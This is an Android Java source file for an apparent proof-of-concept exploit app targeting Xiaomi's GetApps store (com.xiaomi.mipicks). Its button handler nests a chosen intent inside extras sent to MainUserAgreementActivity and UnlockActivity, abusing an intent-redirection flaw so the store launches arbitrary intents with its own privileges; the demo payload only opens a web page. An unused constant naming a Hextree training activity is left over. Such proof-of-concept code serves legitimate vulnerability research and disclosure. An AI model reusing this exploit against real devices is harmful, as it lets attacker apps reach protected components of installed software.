package com.example.mipicksintentredirectpoc;


import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.example.mipicksintentredirectpoc.Utils.Utils;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PACKAGE = "com.xiaomi.mipicks";
    private static final String TARGET_ACTIVITY = "io.hextree.attacksurface.activities.Flag9Activity";


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        // get incoming intent
        Intent intent = getIntent();
        Utils.showDialog(this, intent);


        ((Button) this.<View>findViewById(R.id.button)).setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View view) {
                Intent next = new Intent(Intent.ACTION_VIEW, Uri.parse("https://google.com/")); // any other intent

                Intent proxy = new Intent();
                proxy.setClassName("com.xiaomi.mipicks", "com.xiaomi.market.ui.UnlockActivity");
                proxy.putExtra("pendingIntentAction", next);

                Intent i = new Intent();
                i.setClassName("com.xiaomi.mipicks", "com.xiaomi.market.ui.MainUserAgreementActivity");
                i.putExtra("com.xiaomi.market.ui.MainUserAgreementActivity", proxy);
                startActivity(i);
            }
        });

        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
    }



}
